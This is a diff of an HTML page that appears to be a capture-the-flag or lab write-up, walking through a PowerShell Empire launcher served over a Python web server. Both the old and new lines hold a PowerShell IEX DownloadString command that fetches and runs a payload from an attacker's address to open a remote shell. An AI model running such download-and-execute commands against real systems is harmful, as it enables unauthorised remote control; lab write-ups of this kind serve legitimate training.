@@ -55,7 +55,7 @@
 					                  1 - In empire we generate a powershell launcher, and start up a listener. <br/> <br/>
 					                  2 - Drop the launcher into a launcher.bat file <br/> <br/>
 					                  3 - Start up a python webserver to serve the launcher.bat file <br/> <br/>
-					                  4 - Run the github exploit with <b> powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.23/nc.exe')" </b> <br/> <br/> <br/>
+					                  4 - Run the github exploit with <b> powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10/launcher.bat')" </b> <br/> <br/> <br/>
 					
 					This should pull our launcher.bat file, make the connection to our empire agent, which feeds it the rest of a fully interactive shell. <br/>
 					We should end up with a fully interactive empire agent if all goes right. <br/> <br/> <br/>
